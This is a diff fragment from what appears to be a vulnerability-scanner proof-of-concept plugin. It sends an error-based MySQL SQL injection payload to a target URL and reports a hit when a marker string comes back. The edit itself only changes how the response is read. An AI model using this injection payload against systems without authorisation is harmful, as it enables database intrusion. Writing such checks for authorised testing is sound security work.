@@ -53,7 +53,7 @@ class Poc(ABPoc):
                        "CONCAT(0x716b6a6271,(SELECT (CASE WHEN (4650=4650) THEN 1 ELSE 0 END)),"
                        "0x7178787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)")
             verify_url = url + payload
-            content = requests.get(verify_url).content
+            content = requests.get(verify_url).text
             if 'qkjbq1qxxpq1' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
